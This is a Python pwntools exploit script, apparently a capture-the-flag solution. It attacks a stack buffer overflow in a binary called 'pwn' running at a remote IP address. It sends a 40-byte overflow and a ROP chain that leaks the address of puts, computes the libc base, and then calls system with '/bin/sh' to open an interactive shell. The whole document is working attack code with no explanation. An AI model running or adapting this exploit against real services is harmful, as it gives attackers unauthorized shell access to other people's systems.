from pwn import *
local = 0
if local :
    a=process("./pwn")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("172.1.14.8","8888")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF("./pwn")
def debug():
    gdb.attach(a,'''
    b *()
    ''')
a.recvuntil("\n")
a.sendline("1")
pop_rdi_ret=0x0000000000400713
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
payload='A'*40
payload+=p64(pop_rdi_ret)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(0x000000000400540)#ssss
a.recvuntil("What do you want to say to me?\n")
a.sendline(payload)

libc_base=u64(a.recv(6).ljust(8,'\x00'))-libc.symbols["puts"]
success("libc_addr ==> 0x%x"%libc_base)

a.recvuntil("\n")
a.sendline("aaa")
a.recvuntil("What do you want to say to me?\n")
system_addr=libc_base+libc.symbols["system"]
sh_addr=libc_base+next(libc.search("/bin/sh"))
payload='A'*40
payload+=p64(pop_rdi_ret)
payload+=p64(sh_addr)
payload+=p64(system_addr)

a.sendline(payload)


a.interactive()